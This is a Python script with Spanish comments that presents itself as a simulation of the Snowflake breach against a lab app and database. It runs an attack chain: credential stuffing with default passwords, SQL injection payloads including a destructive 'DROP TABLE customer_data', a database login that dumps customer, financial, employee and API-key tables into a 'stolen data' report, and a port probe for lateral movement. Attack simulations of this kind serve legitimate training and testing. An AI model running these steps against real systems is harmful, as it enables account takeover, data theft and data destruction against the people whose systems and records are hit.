#!/usr/bin/env python3
"""
Simulador de ataque a plataforma Snowflake
Simula técnicas utilizadas en el ataque real
"""

import requests
import time
import random
import psycopg2
from datetime import datetime

class SnowflakeAttackSimulator:
    def __init__(self, target_app="http://vulnerable-app:8080", target_db="snowflake-db"):
        self.target_app = target_app
        self.target_db = target_db
        self.stolen_data = []
        
    def credential_stuffing(self):
        """Simula ataque de credential stuffing"""
        print("[*] Iniciando credential stuffing...")
        
        # Lista de credenciales comunes (simulando fuga previa)
        credentials = [
            {'username': 'admin', 'password': 'Admin123'},
            {'username': 'admin', 'password': 'admin'},
            {'username': 'administrator', 'password': 'Admin123'},
            {'username': 'sysadmin', 'password': 'Snowflake2024!'},
        ]
        
        for creds in credentials:
            try:
                response = requests.post(
                    f"{self.target_app}/login",
                    json=creds,
                    timeout=5
                )
                
                if response.status_code == 200:
                    print(f"[+] Credenciales válidas encontradas: {creds}")
                    return creds
            except:
                continue
        
        print("[-] No se encontraron credenciales válidas")
        return None
    
    def sql_injection(self):
        """Simula ataque de inyección SQL"""
        print("[*] Probando inyección SQL...")
        
        payloads = [
            "' OR '1'='1",
            "'; DROP TABLE customer_data;--",
            "admin'--",
            "' UNION SELECT * FROM customer_data--"
        ]
        
        for payload in payloads:
            try:
                # Primero login
                login_data = {'username': 'admin', 'password': 'Admin123'}
                response = requests.post(
                    f"{self.target_app}/login",
                    json=login_data
                )
                
                if response.status_code == 200:
                    # Intentar inyección
                    query = f"SELECT * FROM users WHERE username = '{payload}'"
                    response = requests.post(
                        f"{self.target_app}/query",
                        json={'query': query},
                        cookies=response.cookies
                    )
                    
                    if response.status_code == 200:
                        print(f"[+] Inyección SQL exitosa con payload: {payload}")
                        return True
            except Exception as e:
                continue
        
        return False
    
    def data_exfiltration(self):
        """Simula exfiltración de datos"""
        print("[*] Iniciando exfiltración de datos...")
        
        try:
            # Conectar directamente a la base de datos (simulando acceso comprometido)
            conn = psycopg2.connect(
                host=self.target_db,
                database="snowflake_sim",
                user="admin",
                password="Admin123",
                port=5432
            )
            
            cur = conn.cursor()
            
            # Exfiltrar diferentes tipos de datos
            tables = ['customer_data', 'financial_records', 'employee_info', 'api_keys']
            
            for table in tables:
                try:
                    cur.execute(f"SELECT COUNT(*) FROM {table}")
                    count = cur.fetchone()[0]
                    
                    if count > 0:
                        print(f"[+] Encontrada tabla '{table}' con {count} registros")
                        
                        # Exfiltrar una muestra
                        cur.execute(f"SELECT * FROM {table} LIMIT 10")
                        data = cur.fetchall()
                        self.stolen_data.append({
                            'table': table,
                            'records': data,
                            'timestamp': datetime.now().isoformat()
                        })
                        
                        print(f"[*] Exfiltrados {len(data)} registros de {table}")
                except:
                    continue
            
            cur.close()
            conn.close()
            
            print(f"[+] Exfiltración completada. Total de datos: {len(self.stolen_data)} tablas")
            return True
            
        except Exception as e:
            print(f"[-] Error en exfiltración: {e}")
            return False
    
    def simulate_lateral_movement(self):
        """Simula movimiento lateral en la red"""
        print("[*] Simulando movimiento lateral...")
        
        # Intentar descubrir otros servicios
        ports = [22, 80, 443, 8080, 8443, 9000]
        
        for port in ports:
            try:
                response = requests.get(f"http://{self.target_db}:{port}", timeout=2)
                print(f"[+] Puerto {port} abierto en {self.target_db}")
            except:
                continue
    
    def run_full_attack(self):
        """Ejecuta el ataque completo"""
        print("="*60)
        print("SIMULACIÓN DE ATAQUE SNOWFLAKE")
        print("="*60)
        
        # Paso 1: Credential stuffing
        creds = self.credential_stuffing()
        if not creds:
            print("[-] Ataque detenido: sin credenciales válidas")
            return
        
        # Paso 2: Inyección SQL
        self.sql_injection()
        
        # Paso 3: Exfiltración de datos
        self.data_exfiltration()
        
        # Paso 4: Movimiento lateral
        self.simulate_lateral_movement()
        
        # Generar reporte
        self.generate_report()
        
        print("[+] Simulación de ataque completada")
    
    def generate_report(self):
        """Genera reporte del ataque"""
        report = {
            'attack_timestamp': datetime.now().isoformat(),
            'target_system': 'Snowflake Simulation',
            'techniques_used': [
                'Credential Stuffing',
                'SQL Injection',
                'Data Exfiltration',
                'Lateral Movement'
            ],
            'data_stolen': len(self.stolen_data),
            'details': self.stolen_data
        }
        
        # Guardar reporte
        with open('/scripts/attack_report.json', 'w') as f:
            import json
            json.dump(report, f, indent=2)
        
        print(f"[+] Reporte generado: attack_report.json")

if __name__ == "__main__":
    simulator = SnowflakeAttackSimulator()
    simulator.run_full_attack()
